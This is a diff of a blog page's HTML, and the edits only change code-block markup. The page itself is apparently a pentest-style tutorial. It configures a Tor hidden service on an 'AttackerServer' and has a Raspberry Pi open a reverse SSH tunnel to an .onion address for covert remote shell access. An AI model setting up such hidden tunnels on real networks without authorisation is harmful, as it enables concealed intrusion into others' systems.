@@ -398,10 +398,9 @@ window.addEventListener("load", function(){
 
 <p>Edit the <code class="highlighter-rouge">/etc/tor/torrc</code> file and modify these lines:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>HiddenServiceDir /var/lib/tor/hidden_service/
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HiddenServiceDir /var/lib/tor/hidden_service/
 HiddenServicePort 30022 127.0.0.1:22
-</code></pre>
-</div>
+</code></pre></div></div>
 <p>where 30022 is the port open to the TOR network redirecting traffic to 127.0.0.1 port 22.</p>
 
 <p>For further client authorization look at the <code class="highlighter-rouge">HiddenServiceAuthorizeClient</code> directive.</p>
@@ -411,27 +410,23 @@ HiddenServicePort 30022 127.0.0.1:22
 <p>For example: <code class="highlighter-rouge">irpqznciwifhpqgd.onion</code></p>
 
 <p>Change also the file <code class="highlighter-rouge">/etc/tor/torsocks.conf</code> the line:</p>
-<div class="highlighter-rouge"><pre class="highlight"><code>AllowOutboundLocalhost 1
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AllowOutboundLocalhost 1
+</code></pre></div></div>
 <p>This is needed to torsocks</p>
 
 <h1 id="from-the-raspberry">From the Raspberry:</h1>
 
 <ul>
   <li>Copy the RSA key to the Server with:
-    <div class="highlighter-rouge"><pre class="highlight"><code>$ ssh-copy-id -i .ssh/id_rsa.pub lobs@AttackerServer.domain
-</code></pre>
-    </div>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh-copy-id -i .ssh/id_rsa.pub lobs@AttackerServer.domain
+</code></pre></div>    </div>
     <p>If id_rsa.pub doesn’t already exists then:</p>
-    <div class="highlighter-rouge"><pre class="highlight"><code>$ ssh-keygen
-</code></pre>
-    </div>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh-keygen
+</code></pre></div>    </div>
   </li>
   <li>The command to launch is:
-    <div class="highlighter-rouge"><pre class="highlight"><code>$ torsocks ssh -p 30022 -N -R 2222:localhost:22 pi@irpqznciwifhpqgd.onion
-</code></pre>
-    </div>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ torsocks ssh -p 30022 -N -R 2222:localhost:22 pi@irpqznciwifhpqgd.onion
+</code></pre></div>    </div>
   </li>
 </ul>
 
@@ -447,9 +442,8 @@ HiddenServicePort 30022 127.0.0.1:22
 <ol>
   <li>SSH into his server on port 30022.</li>
   <li>Run the command:
-    <div class="highlighter-rouge"><pre class="highlight"><code>$ ssh -p 2222 -l lobs localhost
-</code></pre>
-    </div>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -p 2222 -l lobs localhost
+</code></pre></div>    </div>
   </li>
 </ol>
 
@@ -487,6 +481,36 @@ HiddenServicePort 30022 127.0.0.1:22
 </article>
 <hr />
 
+
+    
+    
+        
+            
+        
+            
+        
+    
+        
+            
+        
+            
+        
+    
+
+    
+    
+        
+            
+        
+            
+        
+    
+        
+            
+        
+            
+        
+    
 
     
     
